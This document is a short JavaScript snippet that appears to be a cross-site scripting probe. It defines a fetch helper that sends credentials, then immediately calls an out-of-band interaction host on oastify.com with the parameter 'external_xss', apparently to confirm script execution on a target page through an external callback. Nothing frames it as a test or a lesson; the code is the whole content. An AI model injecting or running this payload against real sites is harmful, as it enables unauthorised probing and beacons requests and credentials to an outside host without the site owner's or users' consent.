// GET Request with Query Parameters
async function getRequest(url, params = {}, headers = {}) {
  const queryString = new URLSearchParams(params).toString();
  const fullUrl = queryString ? `${url}?${queryString}` : url;
  
  const response = await fetch(fullUrl, {
    method: 'GET',
    headers: headers,
    credentials: 'include'
  });
  return response.json();
}


const test =  getRequest('http://md329pt7yeggyqrpetj5s8jdg4mvam0ap.oastify.com', { test: 'external_xss'  });

